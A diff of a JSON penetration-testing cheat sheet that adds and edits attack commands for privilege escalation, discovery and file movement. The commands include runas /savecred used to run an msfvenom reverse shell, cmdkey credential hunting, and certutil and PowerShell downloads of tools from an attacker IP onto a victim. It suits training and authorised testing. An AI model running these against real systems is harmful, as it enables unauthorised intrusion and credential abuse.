@@ -61,7 +61,7 @@
             "description": "Needs access to remote code execution."
         },
         {
-            "command": "groovy > [temp placement]",
+            "command": "groovy> [temp placement]",
             "section": "Initial Access",
             "description": "second initial access placeholder"
         }
@@ -72,7 +72,17 @@
         {
             "command": "GTFObins",
             "section": "Privilege Escalation",
-            "description" : "Check the GTFOBins website and find executables that you can run as a higher level user. This website contains a curated list of binaries that can produce a shell."
+            "description" : "[Windows][Linux] Check the GTFOBins website and find executables that you can run as a higher level user. This website contains a curated list of binaries that can produce a shell."
+        },
+        {
+            "command": "runas /savecred /user:[escalated user] \"[exe path]\"",
+            "section": "Privilege Escalation",
+            "description": "[Windows] If you see that runas /savecred is available or have identified stored credentials for a privileged user, you can run commands as that privileged user without supplying a password. Generate a reverse shell using msfvenom, upload to victim system, and run it using the runas command."
+        },
+        {
+            "command": "sudo -l",
+            "section": "Privilege Escalation",
+            "description": "[Linux] This checks for sudo commands that can be run without supplying a password. Can potentially be paired with GTFOBins."
         }
     ],
 
@@ -86,7 +96,7 @@
         {
             "command": "Using windows-exploit-suggester",
             "section": "Discovery",
-            "description": "On the (victim) windows shell, do 'systeminfo' and save the output. <br><br> On the kali (attacker) system, do 'python windows-exploit-suggester.py --update'. This should output an xls or xlsx file. <br><br> (Might have to do 'pip install xlrd') Then do 'python windows-exploit-suggester.py --database [.xls file] --systeminfo [systeminfo file]'. From their github page: \"This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.\""
+            "description": "[Windows]<br>1. On the (victim) windows shell, do 'systeminfo' and save the output. <br><br> 2. On the kali (attacker) system, do 'python windows-exploit-suggester.py --update'. This should output an xls or xlsx file. <br><br> 3. (Might have to do 'pip install xlrd') Then do 'python windows-exploit-suggester.py --database [.xls file] --systeminfo [systeminfo file]'. From their github page: \"This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.\""
         },
         {
             "command": "net user [user]",
@@ -94,9 +104,14 @@
             "description": "[Windows] Gets information on the user, can be utilized to check what groups a user is in. Groups will be listed under Global Group Memberships and/or Local Group Memberships"
         },
         {
+            "command": "cmdkey /list",
+            "section": "Discovery",
+            "description": "[Windows] Identify stored credentials. If you see a priviliged level user (admin/administrator), check the corresponding runas command in the privesc section."
+        },
+        {
             "command": "Get-ADGroupMember [AD Group] | select name",
             "section": "Discovery",
-            "description": "[Windows] PowerShell command that gets all members of the AD group, then from that list only output the names."
+            "description": "[Windows] PowerShell command that gets all members of the AD (Active Directory) group, then from that list only output the names."
         },
         {
             "command": "cat /etc/passwd",
@@ -109,9 +124,9 @@
             "description": "[Linux] Finds all files starting from the directory supplied that is owned by the user. The output is piped to a grep -v command to exclude files that are flagged as permission denied."
         },
         {
-            "command": "find <directory> -group <group> 2>&1 | grep -v \"Permission denied\"",
+            "command": "find [directory] -group [group] 2>&1 | grep -v \"Permission denied\"",
             "section": "Discovery",
-            "description": "Finds all files starting from the directory supplised that is owned by the group. The output is piped to a grep -v command to exclude files that are flagged as permission denied."
+            "description": "[Linux] Finds all files starting from the directory supplised that is owned by the group. The output is piped to a grep -v command to exclude files that are flagged as permission denied."
         },
         {
             "command": "netstat -tulp",
@@ -125,7 +140,17 @@
         {
             "command": "powershell -c \"Invoke-WebRequest http://10.13.22.171:80/winPEASx86.exe -OutFile winPEASx86.exe\"",
             "section": "Exfiltration/File Movement",
-            "description": "Download file from attacker computer to victim computer with powershell on victim pc. This requires attacker computer to have file server - see hosting file server commands. The first part 'powershell -c' is to execute a powershell command/scriptblock from command line. "
-        }      
+            "description": "[Windows] Download file from attacker computer to victim computer with powershell on victim pc. This requires attacker computer to have file server - see hosting file server commands. The first part 'powershell -c' is to execute a powershell command/scriptblock from command line. "
+        },
+        {
+            "command": "certutil.exe -urlcache -f [address] [output name]",
+            "section": "Exfiltration/File Movement",
+            "description": "[Windows] Download files to the victim system using native OS binary."
+        },
+        {
+            "command": "get \"[file name]\"",
+            "section": "Exfiltration/File Movement",
+            "description": "Downloads files from an FTP server. It’s important to distinguish if you need to utilize FTP’s ASCII mode or Binary mode as initially when connecting to a FTP server, ASCII mode is the default mode. To change mode you can simply type 'binary' in the FTP shell. File types to use ASCII mode: txt, asp, html, php (generally text-based files such as source code, web pages, etc). File types to use binary mode: jpg, gif, wav, mp3, mp4, zip, tar, exe, pdf, mdb (generally image files, sound files, video files, archive files, etc)."
+        }
     ]
 }
